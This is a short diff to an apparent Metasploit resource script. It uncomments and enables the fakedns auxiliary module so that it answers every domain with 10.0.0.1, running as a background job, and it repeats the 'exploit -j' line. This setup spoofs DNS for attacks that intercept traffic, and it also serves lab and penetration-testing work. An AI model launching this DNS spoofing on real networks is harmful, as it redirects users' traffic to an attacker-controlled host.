@@ -1,10 +1,11 @@
 #DNS
 
-#use auxiliary/server/fakedns
-#set TARGETACTION FAKE
-#set TARGETHOST 10.0.0.1
-#set TARGETDOMAIN *
-#exploit -j
+use auxiliary/server/fakedns
+set TARGETACTION FAKE
+set TARGETHOST 10.0.0.1
+set TARGETDOMAIN *
+exploit -j
+exploit -j
 
 #Unencrypted services
 
